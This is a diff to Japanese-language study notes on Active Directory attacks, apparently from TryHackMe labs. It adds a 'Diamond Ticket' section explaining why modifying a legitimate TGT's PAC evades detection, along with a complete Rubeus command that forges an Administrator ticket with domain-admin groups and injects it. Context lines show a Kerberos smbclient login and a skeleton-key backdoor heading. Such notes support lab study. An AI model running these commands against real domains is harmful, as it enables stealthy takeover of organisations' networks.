@@ -217,6 +217,16 @@ export KRB5CCNAME=Administrator.ccache
 smbclient.py thm.loc/Administrator@SERVER1.thm.loc -k -no-pass -dc-ip 192.168.11.100
 ```
 
+### [ダイヤモンドチケット](https://tryhackme.com/room/krbticketattacks?taskNo=2&sharerId=674ed42e2374d1bc93db444c)
+
+攻撃者は通常通り認証を行い、正規のTGTを受け取り、KRBTGTキーで復号し、PACを変更し、署名を再計算し、再暗号化する。
+
+実際の認証が行われるため、先行するTGTリクエストのないサービスチケットリクエストに基づく検出は決して発生せず、AESキーを使用することで、デフォルトのゴールデンチケットを明らかにする暗号化のダウングレードを回避できる。そのためゴールデンチケットと比べて検出されにくい。
+
+```sh
+Rubeus.exe diamond /domain:lunarbank.thm /user:j.reeves /password:<password> /dc:LB-DC01.lunarbank.thm /enctype:aes256 /krbkey:<krbtgt_aes256_key> /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt
+```
+
 ## Backdoor（スケルトンキー）
 
 ドメインフォレストのメモリに埋め込まれることで、マスターパスワードを持つ任意のマシンへのアクセスを可能にする。  
